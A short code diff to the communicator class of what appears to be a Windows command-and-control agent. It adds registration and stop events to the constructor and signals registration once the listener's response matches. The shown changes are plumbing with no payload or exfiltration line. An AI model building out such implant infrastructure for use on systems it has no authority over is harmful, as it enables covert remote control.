@@ -1,9 +1,10 @@
 #include <Windows.h>
 #include "utils/winapi.h"
 #include "communicators/base.h"
+#include "utils/event.h"
 
 /* Constructor */
-BaseCommunicator::BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue)
+BaseCommunicator::BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pEventRegister, Event *pEventAgentShouldStop)
     : pWinApiCustom(pWinApiCustom),
       listenerHost(host),
       listenerPort(port),
@@ -11,7 +12,9 @@ BaseCommunicator::BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWOR
       pCommunicateWithListenerData(NULL),
       communicateWithListenerDataSize(0),
       pTaskInputQueue(pTaskInputQueue),
-      pTaskOutputQueue(pTaskOutputQueue) {}
+      pTaskOutputQueue(pTaskOutputQueue),
+      pEventRegister(pEventRegister),
+      pEventAgentShouldStop(pEventAgentShouldStop) {}
 
 /* Destructor */
 BaseCommunicator::~BaseCommunicator() {}
@@ -82,7 +85,12 @@ BOOL BaseCommunicator::IsAgentRegistrationSuccessful()
         result = CompareBuffer(pRegistrationResponseCorrect, registrationResponseActual, registrationResponseCorrectSize);
         if (result)
         {
+            // Remove registration input from Listener because it's not a Task
             this->pTaskInputQueue->DequeueAt(i);
+
+            // Set registration event
+            this->pEventRegister->Set();
+
             break;
         }
     }
